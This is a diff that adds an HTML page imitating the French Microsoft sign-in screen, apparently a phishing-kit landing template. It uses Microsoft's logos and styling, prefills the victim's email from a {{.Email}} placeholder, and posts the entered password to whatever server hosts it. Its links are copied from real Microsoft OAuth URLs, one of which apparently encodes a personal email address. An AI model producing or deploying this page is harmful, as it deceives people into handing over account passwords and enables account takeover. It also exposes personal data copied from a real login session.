@@ -1,0 +1,70 @@
+<!DOCTYPE html><html lang="fr"><head><meta charset="UTF-8"/>
+	<title>Connexion Microsoft</title>
+	<link href="https://aadcdn.msftauth.net/ests/2.1/content/images/favicon_a_eupayfgghqiai7k9sol6lg2.ico" rel="shortcut icon"/>
+	<style type="text/css">body {
+            margin: 0;
+            background-image: url('https://aadcdn.msftauth.net/shared/1.0/content/images/backgrounds/2_bc3d32a696895f78c19df6c717586a5d.jpg');
+            background-repeat: no-repeat;
+            background-attachment: fixed;
+            background-size: cover;
+            font-family: "Segoe UI", "Helvetica Neue", sans-serif;
+        }
+        .outer { display: table; position: absolute; height: 100%; width: 100%; }
+        .middle { display: table-cell; vertical-align: middle; }
+        .inner {
+            margin-left: auto;
+            margin-right: auto;
+            max-width: 440px;
+            width: calc(100% - 40px);
+            padding: 44px;
+            background-color: #fff;
+            box-shadow: 0 2px 6px rgba(0,0,0,0.2);
+            min-width: 320px;
+        }
+        .logo { height: 24px; margin-bottom: 20px; }
+        .text-title { font-size: 1.5rem; font-weight: 600; margin-bottom: 12px; color: #1b1b1b; }
+        .form-control {
+            width: 100%;
+            height: 36px;
+            border: none;
+            border-bottom: 1px solid #666;
+            padding: 6px 0;
+            margin-bottom: 16px;
+            font-size: 15px;
+            outline: none;
+        }
+        .form-control:focus { border-bottom: 2px solid #0067b8; }
+        .btn-primary {
+            background-color: #0067b8;
+            color: #fff;
+            border: none;
+            padding: 4px 12px;
+            min-width: 108px;
+            height: 32px;
+            float: right;
+            cursor: pointer;
+        }
+        .btn-primary:hover { background-color: #005da6; }
+        .secondary-text { font-size: 13px; color: #1b1b1b; margin-top: 20px; display: inline-block; }
+        .links { margin-top: 15px; font-size: 13px; }
+        .links a { color: #0067b8; text-decoration: none; }
+	</style>
+</head>
+<body>
+<div class="outer">
+<div class="middle">
+<div class="inner"><img alt="Microsoft" class="logo" src="https://aadcdn.msftauth.net/ests/2.1/content/images/microsoft_logo_ee5c8d9fb6248c938fd0dc19370e90bd.svg"/>
+<div class="text-title">Connexion</div>
+
+<form action="" method="POST"><input class="form-control" value="{{.Email}}" placeholder="E-mail, téléphone ou Skype" required="" type="email"/> <input class="form-control" type="password" placeholder="Mot de passe" required="" name="password"/>
+<div class="links">Pas de compte ?<a href="https://login.live.com/oauth20_authorize.srf?client_id=9199bf20-a13f-4107-85dc-02114787ef48&amp;scope=https%3a%2f%2foutlook.office.com%2f.default+openid+profile+offline_access&amp;redirect_uri=https%3a%2f%2foutlook.live.com%2fmail%2f&amp;response_type=code&amp;state=eyJpZCI6IjAxOWM5NTIxLWJkZjItNzc2Zi05NGFlLTUwY2YwMjM4ZjQwZSIsIm1ldGEiOnsiaW50ZXJhY3Rpb25UeXBlIjoicmVkaXJlY3QifX0%3d%7caHR0cHM6Ly9vdXRsb29rLmxpdmUuY29tL21haWwvMC8&amp;response_mode=fragment&amp;nonce=019c9521-bdf2-73e1-8938-dd0a3a87d61b&amp;code_challenge=5N4ZzWHP8lCkyptsW2IgesDt4YL-ftQy3SxLswlVJzA&amp;code_challenge_method=S256&amp;x-client-SKU=msal.js.browser&amp;x-client-Ver=4.28.2&amp;uaid=1d8deae8d2c3b08d63df836fe8b0d96b&amp;msproxy=1&amp;issuer=mso&amp;tenant=common&amp;ui_locales=fr&amp;client_info=1&amp;signup=1&amp;lw=1&amp;fl=dob%2cflname%2cwld&amp;epctrc=upNkgYtW0FhvaLm6ssYgKxZUFJpVzKoLG7Vga1bbwXE%3d5%3a1%3aCANARY%3a9i2Fp%2bLUlflSfMSK2F1zKJRN2RokkK1WqkWu6ooUUmg%3d&amp;epct=PAQABDgEAAACvnsHKEvvRQb3Bz3Qc7wnaRXZvU3RzQXJ0aWZhY3RzCAAAAAAA21FlSMvYFpLCMeUqvSUXiOcv1nE35e0SnbSo5zpnMO0hUj7RzLVEGjlPnQ029oLs2U97tPm8mmX622GzImChWM42FqW9t09VjpDJV1_MXyZwrcOTqi8rqwUisDiitoX4Jk9RDlTS5U3Wz7ukWucRtx60ZvdaRnHd_5mNpIyee-9r8F5WXQyCHC9lnqN3TAwrbzGNQHzi5eFZErr-n-v5QCAA&amp;jsh=3%24dvi.priv%2540gmail.com%24luc%24dai%24N2wXF6Io%242%240%240%2412791228018099823105%240&amp;jshs=0&amp;cobrandid=ab0455a0-8d03-46b9-b18b-df2f57b9e44c&amp;claims=%7b%22access_token%22%3a%7b%22xms_cc%22%3a%7b%22values%22%3a%5b%22CP1%22%5d%7d%7d%7d"> Créez-en un !</a><br/>
+<a href="https://login.microsoftonline.com/common/oauth2/v2.0/authorize?client_id=9199bf20-a13f-4107-85dc-02114787ef48&amp;scope=https%3A%2F%2Foutlook.office.com%2F.default%20openid%20profile%20offline_access&amp;redirect_uri=https%3A%2F%2Foutlook.live.com%2Fmail%2F&amp;client-request-id=1d8deae8-d2c3-b08d-63df-836fe8b0d96b&amp;response_mode=fragment&amp;client_info=1&amp;prompt=select_account&amp;nonce=019c9521-bdf2-73e1-8938-dd0a3a87d61b&amp;state=eyJpZCI6IjAxOWM5NTIxLWJkZjItNzc2Zi05NGFlLTUwY2YwMjM4ZjQwZSIsIm1ldGEiOnsiaW50ZXJhY3Rpb25UeXBlIjoicmVkaXJlY3QifX0%3D%7CaHR0cHM6Ly9vdXRsb29rLmxpdmUuY29tL21haWwvMC8&amp;claims=%7B%22access_token%22%3A%7B%22xms_cc%22%3A%7B%22values%22%3A%5B%22CP1%22%5D%7D%7D%7D&amp;x-client-SKU=msal.js.browser&amp;x-client-VER=4.28.2&amp;response_type=code&amp;code_challenge=YSudW2SVdJc092CGtNizT5gVHoLAjAf7wngOvsIg588&amp;code_challenge_method=S256&amp;cobrandid=ab0455a0-8d03-46b9-b18b-df2f57b9e44c&amp;fl=dob,flname,wld">Vous ne pouvez pas accéder à votre compte ?</a></div>
+
+<div style="margin-top: 40px; overflow: hidden;"><input class="btn-primary" type="submit" value="Se connecter"/></div>
+</form>
+</div>
+</div>
+</div>
+
+
+</body></html>
